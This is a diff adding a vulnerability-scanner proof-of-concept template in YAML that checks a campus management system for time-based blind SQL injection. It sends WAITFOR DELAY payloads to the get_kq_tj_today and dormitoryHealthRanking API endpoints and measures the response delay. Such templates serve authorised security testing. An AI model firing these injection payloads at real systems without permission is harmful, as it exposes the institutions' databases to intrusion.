@@ -1,0 +1,43 @@
+name: poc-yaml-kexunxiaoyuan-get_kq_tj_today-dormitoryHealthRanking-sql
+transport: http
+
+
+ 
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:6%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:10%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+  r2:
+    request:
+      method: GET
+      path: /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r3:
+    request:
+      method: GET
+      path: /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A10%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 10000 && response.latency <= 11000
+expression: r0() && r1() || r2() && r3()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/140709894
+
+
